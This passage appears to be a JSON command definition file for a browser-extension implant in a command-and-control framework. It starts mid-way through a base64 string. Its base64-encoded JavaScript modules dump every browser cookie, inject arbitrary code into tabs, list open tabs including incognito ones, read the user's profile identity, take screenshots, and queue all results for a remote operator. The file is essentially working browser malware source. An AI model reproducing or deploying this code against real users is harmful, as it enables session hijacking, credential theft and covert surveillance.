NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cookiedump",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Dump all cookies from the currently selected cookie jar",
          "cmd": "cookiedump",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "cookiedump.js": "ZXhwb3J0cy5jb29raWVkdW1wID0gZnVuY3Rpb24odGFzaykgewogICAgdHJ5IHsKICAgICAgICBsZXQgcmVzdWx0cyA9IFtdOwogICAgICAgIGNocm9tZS5jb29raWVzLmdldEFsbENvb2tpZVN0b3JlcyhmdW5jdGlvbihzdG9yZXMpIHsKICAgICAgICAgICAgc3RvcmVzLmZvckVhY2goZnVuY3Rpb24gKHN0b3JlKSB7CiAgICAgICAgICAgICAgICBjb25zdCBmaWx0ZXIgPSB7fTsKICAgICAgICAgICAgICAgIGZpbHRlclsic3RvcmVJZCJdID0gc3RvcmUuaWQ7CiAgICAgICAgICAgICAgICBjaHJvbWUuY29va2llcy5nZXRBbGwoeyJzdG9yZUlkIjogc3RvcmUuaWR9LCBmdW5jdGlvbiAoY29va2llcykgewogICAgICAgICAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsndGFza19pZCc6dGFzay5pZCwgJ3VzZXJfb3V0cHV0JzpKU09OLnN0cmluZ2lmeShjb29raWVzLCBudWxsLCAyKSwgJ2NvbXBsZXRlZCc6dHJ1ZX07CiAgICAgICAgICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBsZXQgcmVzcG9uc2UgPSB7InRhc2tfaWQiOnRhc2suaWQsICJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiJlcnJvciJ9OwogICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "inject {\"tabid\":0,\"javascript\":\"base64 encoded javascript\"}",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Inject arbitrary javascript into a browser tab",
          "cmd": "inject",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "tabid"
            },
            {
              "type": "String",
              "hint": "Base64 encoded javascript",
              "choices": "",
              "required": true,
              "name": "javascript"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "inject.js": "ZXhwb3J0cy5pbmplY3QgPSBmdW5jdGlvbih0YXNrKSB7CiAgICAvLyBleGVjdXRlIGN1c3RvbSBqYXZhc2NyaXB0IGNvZGUgaW4gYSB0YWIKICAgIHRyeSB7CiAgICAgICAgbGV0IGFyZ3MgPSBKU09OLnBhcnNlKGF0b2IodGFzay5wYXJhbWV0ZXJzLnRvU3RyaW5nKCkpKTsKICAgICAgICBjb25zdCB0YWIgPSBNYXRoLnJvdW5kKGFyZ3MudGFiaWQpOwogICAgICAgIGNvbnN0IGNvZGUgPSBhdG9iKGFyZ3MuamF2YXNjcmlwdCk7CiAgICAgICAgY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCh0YWIsIHsKICAgICAgICAgICAgY29kZTogY29kZQogICAgICAgIH0sIGZ1bmN0aW9uKCl7CiAgICAgICAgICAgIGlmIChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpIHsKICAgICAgICAgICAgICAgIEMyLnNlbmRFcnJvcih0YXNraWQsIHRhc2t0eXBlKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjoiaW5qZWN0ZWQgY29kZSBpbnRvIHRhYiB3aXRoIGlkICIgKyB0YWIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICAgICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ImVycm9yIn07CiAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChtc2cpOwogICAgfQogICAgCn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "load [command_name]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Load a command into the extension",
          "cmd": "load",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "load.js": "ZXhwb3J0cy5sb2FkID0gZnVuY3Rpb24odGFzaykgewogICAgLy8gVE9ETzogbG9hZAogICAgdHJ5IHsKICAgICAgICBsZXQgYXJncyA9IEpTT04ucGFyc2UodGFzay5wYXJhbWV0ZXJzKTsKICAgICAgICBsZXQgcmVzcG9uc2UgPSB7J2FjdGlvbic6J3VwbG9hZCcsJ2Z1bGxfcGF0aCc6JycsICdjaHVua19zaXplJzoxMDI0MDAwLCAnY2h1bmtfbnVtJzoxLCdmaWxlX2lkJzphcmdzLmZpbGVfaWR9OwogICAgICAgIGxldCBlbmNvZGVkUmVzcG9uc2UgPSBKU09OLnN0cmluZ2lmeShyZXNwb25zZSk7CiAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jb2RlZFJlc3BvbnNlOwogICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgIGxvYWRzLnB1c2goeyd0eXBlJzonbG9hZCcsJ25hbWUnOiBhcmdzLmNtZHMsJ2ZpbGVfaWQnOmFyZ3MuZmlsZV9pZCwgJ3Rhc2tfaWQnOnRhc2suaWQsJ2RhdGEnOltdfSk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ImVycm9yIn07CiAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChtc2cpOwogICAgfQoKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "tabs",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve information about all open tabs in the current window",
          "cmd": "tabs",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "tabs.js": "ZXhwb3J0cy50YWJzID0gZnVuY3Rpb24odGFzaykgewogICAgdHJ5IHsKICAgICAgICBjb25zdCBxdWVyeUluZm8gPSB7fTsKICAgICAgICBsZXQgdGFicyA9W107CiAgICAgICAgY2hyb21lLnRhYnMucXVlcnkocXVlcnlJbmZvLCBmdW5jdGlvbihyZXN1bHQpewogICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHJlc3VsdC5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgY29uc3QgaW5kaXZpZHVhbFRhYiA9IHt9OwogICAgICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi53aW5kb3cgPSByZXN1bHRbaV0udGl0bGU7CiAgICAgICAgICAgICAgICBpbmRpdmlkdWFsVGFiLnVybCA9IHJlc3VsdFtpXS51cmw7CiAgICAgICAgICAgICAgICBpbmRpdmlkdWFsVGFiLmluY29nbml0byA9IHJlc3VsdFtpXS5pbmNvZ25pdG87CiAgICAgICAgICAgICAgICBpbmRpdmlkdWFsVGFiLmlkID0gcmVzdWx0W2ldLmlkOwogICAgICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi5hY3RpdmUgPSByZXN1bHRbaV0uYWN0aXZlOwogICAgICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi5oaWdobGlnaHRlZCA9IHJlc3VsdFtpXS5oaWdobGlnaHRlZDsKICAgICAgICAgICAgICAgIGluZGl2aWR1YWxUYWIud2luZG93aWQgPSByZXN1bHRbaV0ud2luZG93SWQ7CgogICAgICAgICAgICAgICAgdGFicy5wdXNoKGluZGl2aWR1YWxUYWIpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBsZXQgb3V0cHV0ID0gSlNPTi5zdHJpbmdpZnkodGFicywgbnVsbCwgMik7CiAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjpvdXRwdXQsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICB9KTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjoiZXJyb3IifTsKICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICB9CiAgICAKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "userinfo",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve user information about the current user",
          "cmd": "userinfo",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "userinfo.js": "ZXhwb3J0cy51c2VyaW5mbyA9IGZ1bmN0aW9uKHRhc2spIHsKICAgIHRyeSB7CiAgICAgICAgY2hyb21lLmlkZW50aXR5LmdldFByb2ZpbGVVc2VySW5mbyhmdW5jdGlvbihpbmZvKXsKICAgICAgICAgICAgaWYgKGluZm8gPT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAndXNlcl9vdXRwdXQnOiAndXNlcmluZm8gZmFpbGVkJywgJ2NvbXBsZXRlZCc6IGZhbHNlLCAnc3RhdHVzJzonZXJyb3InfTsKICAgICAgICAgICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOkpTT04uc3RyaW5naWZ5KGluZm8sIG51bGwsIDIpLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBsZXQgcmVzcG9uc2UgPSB7InRhc2tfaWQiOnRhc2suaWQsICJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiJlcnJvciJ9OwogICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "sleep {\"sleep\":10}",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Change the sleep interval for an agent",
          "cmd": "sleep",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "sleep"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "sleep.js": "ZXhwb3J0cy5zbGVlcCA9IGZ1bmN0aW9uKHRhc2spIHsKICAgIHRyeSB7CiAgICAgICAgbGV0IGFyZ3MgPSBKU09OLnBhcnNlKHRhc2sucGFyYW1ldGVycy50b1N0cmluZygpKTsKICAgICAgICBDMi5pbnRlcnZhbCA9IGFyZ3Muc2xlZXA7CiAgICAgICAgY2xlYXJJbnRlcnZhbChtYWlubG9vcCk7CiAgICAgICAgbWFpbmxvb3AgPSBzZXRJbnRlcnZhbChjMmxvb3AsIEMyLmludGVydmFsICogMTAwMCk7CiAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOiJ1cGRhdGVkIHNsZWVwIHRvICIgKyBDMi5pbnRlcnZhbCwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgbGV0IHJlc3BvbnNlID0geyJ0YXNrX2lkIjp0YXNrLmlkLCAidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjoiZXJyb3IifTsKICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7ImFjdGlvbiI6InBvc3RfcmVzcG9uc2UiLCAicmVzcG9uc2VzIjpbcmVzcG9uc2VdLCAiZGVsZWdhdGVzIjpbXX07CiAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "screencapture",
          "version": 8,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Capture a screenshot of the active tab",
          "cmd": "screencapture",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "screencapture.js": "ZXhwb3J0cy5zY3JlZW5jYXB0dXJlID0gZnVuY3Rpb24odGFzayl7CiAgICB0cnkgewogICAgICAgIGxldCBwYXJhbSA9IHsKICAgICAgICAgICAgJ2Zvcm1hdCc6ICdwbmcnLAogICAgICAgICAgICAncXVhbGl0eSc6IDc1CiAgICAgICAgfTsKICAgICAgICBjaHJvbWUudGFicy5jYXB0dXJlVmlzaWJsZVRhYihwYXJhbSwgZnVuY3Rpb24oaW1nKSB7CiAgICAgICAgICAgIGlmIChpbWcgPT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAndXNlcl9vdXRwdXQnOiAnc2NyZWVuY2FwdHVyZSBmYWlsZWQnLCAnY29tcGxldGVkJzogZmFsc2UsICdzdGF0dXMnOidlcnJvcid9OwogICAgICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgICAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBsZXQgZW5jSW1nID0gaW1nLnRvU3RyaW5nKCkuc3BsaXQoJywnKVsxXTsKICAgICAgICAgICAgICAgIGxldCByYXcgPSBlbmNJbWc7CiAgICAgICAgICAgICAgICBsZXQgdG90YWxjaHVua3MgPSAxOwogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0b3RhbF9jaHVua3MnOnRvdGFsY2h1bmtzLCAndGFza19pZCc6dGFzay5pZCwgJ2Z1bGxfcGF0aCc6dGFzay5wYXJhbWV0ZXJzfTsKICAgICAgICAgICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsiYWN0aW9uIjoicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOltyZXNwb25zZV0sICJkZWxlZ2F0ZXMiOltdfTsKICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICBsZXQgZmluYWwgPSBhcGZlbGwuYXBmZWxsaWQgKyBlbmM7CiAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICAgICAgc2NyZWVuY2FwdHVyZXMucHVzaCh7J3R5cGUnOidzY3JlZW5jYXB0dXJlJywndGFza19pZCc6dGFzay5pZCwgJ2ltYWdlJzpyYXcsICd0b3RhbF9jaHVua3MnOiB0b3RhbGNodW5rc30pOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGxldCByZXNwb25zZSA9IHsidGFza19pZCI6dGFzay5pZCwgInVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ImVycm9yIn07CiAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geyJhY3Rpb24iOiJwb3N0X3Jlc3BvbnNlIiwgInJlc3BvbnNlcyI6W3Jlc3BvbnNlXSwgImRlbGVnYXRlcyI6W119OwogICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChtc2cpOwogICAgfQogICAgCn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        }
      ]
    }
  ]
}
